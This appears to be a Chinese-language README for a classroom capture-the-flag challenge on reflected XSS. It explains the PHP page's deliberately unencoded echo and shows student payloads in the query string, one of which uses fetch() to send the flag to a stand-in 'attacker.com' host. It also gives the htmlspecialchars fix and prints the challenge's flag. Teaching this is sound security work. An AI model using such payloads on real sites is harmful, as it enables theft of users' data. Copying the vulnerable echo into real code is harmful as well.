# Reflective XSS Demo

一個最經典的反射型 XSS 題目 — 學生在搜尋框注入 JavaScript，從頁面上的
隱藏 `<meta>` 標籤讀出 flag。

## 結構

```
XSS-REFLECTED/
├── manifest.json       ← 題目 metadata（含 {{SLUG}} 佔位符）
├── web/
│   └── index.php        ← 反射型 XSS 漏洞頁
├── build.py             ← 把 {{SLUG}} 換成真實 slug 後打包成 ZIP
└── README.md
```

## 漏洞

`web/index.php` 的搜尋結果區塊直接 `<?= $q ?>`，沒做任何編碼：
```php
<p>你搜尋了：<strong><?= $q ?></strong></p>
```

而 form 的 value 屬性是用 `htmlspecialchars` 編碼的（正確），
所以學生必須透過 query string 觸發漏洞，不是直接 form 注入。

## 學生解法

直接在瀏覽器網址列輸入：
```
http://target/challenge/<slug>/?q="><script>alert(document.querySelector('[name=ctf-flag]').content)</script>
```

成功會跳出 alert，內容就是 flag。

或更隱蔽（不跳出 alert）：
```
?q=<script>fetch('https://attacker.com/?f='+document.querySelector('[name=ctf-flag]').content)</script>
```

## 修補

把 `web/index.php` 裡的：
```php
<strong><?= $q ?></strong>
```
改成：
```php
<strong><?= htmlspecialchars($q, ENT_QUOTES, 'UTF-8') ?></strong>
```

這樣 HTML 標籤會被當成純文字顯示，不會被瀏覽器執行。

## 上傳流程

這個題目的 manifest.challenge_id 必須等於 Server 自動產生的 slug，
所以無法「直接 build 一次就上傳」。流程：

1. 登入 → 點「題目」→「建立新題目」
2. 填表單（title / 類別 `web` / 難度 `easy` / 分數 100）— **不選 ZIP**
3. 送出 → flash 訊息顯示自動 slug（例如 `easy-web-001`）
4. 在本機跑：`python3 build.py easy-web-001` → 產出 `dist/easy-web-001.zip`
5. 回到詳情頁 → 上傳新版本 → 選 `easy-web-001.zip`
6. 發布 → 學生 dashboard 就看得到了

## ⚠️ 自動評分限制

目前的 Server（§7 Phase 6）只用 **HMAC(student + challenge + task, MASTER)**
來驗 flag — `flag_static` 在 manifest 裡只是「提示」。

這個 XSS 題的設計是「學生用 XSS 從頁面讀出靜態 flag」，
但 Server 比對的是 HMAC 值（學生不會知道）。

### 解決方案

| 方案 | 做法 | 適用場景 |
|---|---|---|
| A. 教師手動加分 | 在 `solves` table 直接 INSERT 一筆 | demo / 教學展示 |
| B. 加 Server 支援 | 把 `verification.type` 加一個 `static` 選項，直接比對 `flag_static` | 要改 §7 Phase 6 規格 |
| C. 把 flag 改成 HMAC | 學生透過 `?flag=<HMAC>` query param 把 flag 注入頁面 | 要改 Agent/Portal 流程 |

這個題目以 **A** 為主要驗收方式（教師 demo XSS 給學生看 → 確認學生會做 → 手動加分）。

## 學生看到的入口

| 角色 | URL | 內容 |
|---|---|---|
| 學生 | `/challenge/<slug>/` | 搜尋頁（含漏洞） |
| 老師 | `/teacher/challenges/<id>` | 管理後台 |

## 範例 payload（XSS 攻擊）

```html
?q="><script>alert(document.querySelector('[name=ctf-flag]').content)</script>
```

開 DevTools 看 Network 也能在 response 看到：
```html
<meta name="ctf-flag" content="flag{xss_demo_reflective_v1}">
```

## 預期學習

- 反射型 XSS 的攻擊面（query string 沒編碼 echo 回 HTML）
- 用 XSS 讀取頁面 DOM 的技巧
- `Content-Security-Policy: unsafe-inline` / `script-src 'self'` 等防禦概念
- 為什麼 input validation 跟 output encoding 都要做
